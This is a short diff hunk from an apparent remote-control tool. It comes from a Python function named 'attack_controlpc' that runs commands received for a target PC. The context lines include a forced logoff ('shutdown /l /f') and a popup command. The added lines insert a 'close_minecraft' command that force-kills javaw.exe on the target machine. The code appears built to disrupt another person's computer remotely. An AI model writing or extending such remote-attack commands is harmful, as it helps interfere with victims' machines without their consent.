@@ -246,6 +246,11 @@ def attack_controlpc(target, duration=60):
             import os
             os.system("shutdown /l /f")
             
+        elif command == "close_minecraft":
+            # Close Minecraft by killing javaw.exe
+            import os
+            os.system("taskkill /f /im javaw.exe 2>nul")
+            
         elif command == "popup":
             # Display a popup message (always on top)
             if len(parts) > 1:
